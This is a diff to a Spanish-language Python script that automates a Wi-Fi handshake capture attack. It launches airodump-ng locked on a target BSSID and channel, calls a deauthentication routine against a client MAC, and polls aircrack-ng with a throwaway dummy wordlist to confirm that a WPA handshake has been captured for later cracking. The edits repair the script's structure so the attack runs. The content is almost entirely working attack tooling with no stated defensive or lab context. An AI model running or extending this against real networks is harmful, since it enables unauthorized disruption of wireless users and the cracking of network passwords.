@@ -1,23 +1,20 @@
 import subprocess
 import time
-
+import os
+import glob
+import pty
+import tempfile
 
 def iniciar_captura_dirigida(interfaz_monitor: str, bssid: str, canal: str, archivo_salida: str = "captura"):
-    # Ejecuta airodump-ng fijado en el canal y BSSID de la red elegida, y lo deja corriendo en segundo plano (NO lo detiene).
-    
-    comando = [
-        "sudo", "airodump-ng",
-        interfaz_monitor,
-        "--bssid", bssid,
-        "-c", canal,
-        "-w", archivo_salida
-    ]
 
-    proceso = subprocess.Popen(
-        comando,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
+    for archivo_viejo in glob.glob(f"{archivo_salida}-*"):
+        os.remove(archivo_viejo)
+
+    comando = ["sudo", "airodump-ng", interfaz_monitor, "--bssid", bssid, "-c", canal, "-w", archivo_salida]
+
+    maestro, esclavo = pty.openpty()
+    proceso = subprocess.Popen(comando, stdout=esclavo, stderr=esclavo, stdin=esclavo, close_fds=True)
+    os.close(esclavo)
 
     return proceso
 
@@ -42,24 +39,28 @@ def desautenticar(interfaz_monitor: str, bssid: str, mac_cliente: str, cantidad_
 
     print(resultado.stdout + resultado.stderr)
     
-    def esperar_handshake(archivo_cap: str, intentos_maximos: int = 10, espera_segundos: int = 5) -> bool:
-        
-        # Revisa periódicamente si el archivo .cap ya contiene un handshake válido.
+def esperar_handshake(archivo_cap: str, bssid: str, intentos_maximos: int = 10, espera_segundos: int = 5) -> bool:
 
+    # Creamos un diccionario temporal falso, solo para forzar a aircrack-ng
+    # a revisar de verdad si hay datos EAPOL (handshake), en vez de solo
+    # decirnos "dame un diccionario".
+    diccionario_temporal = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
+    diccionario_temporal.write("clave_de_prueba\n")
+    diccionario_temporal.close()
+
+    try:
         for intento in range(intentos_maximos):
             resultado = subprocess.run(
-                ["aircrack-ng", "-b", bssid, archivo_cap],
+                ["aircrack-ng", "-b", bssid, "-w", diccionario_temporal.name, archivo_cap],
                 capture_output=True,
                 text=True
             )
-
             salida = resultado.stdout
-
-            if "1 handshake" in salida:
+            if "Passphrase not in dictionary" in salida or "KEY FOUND" in salida:
                 print("¡Handshake capturado!")
                 return True
-
             print(f"Intento {intento + 1}/{intentos_maximos}: aún no hay handshake, esperando...")
             time.sleep(espera_segundos)
-
         return False
+    finally:
+        os.remove(diccionario_temporal.name)
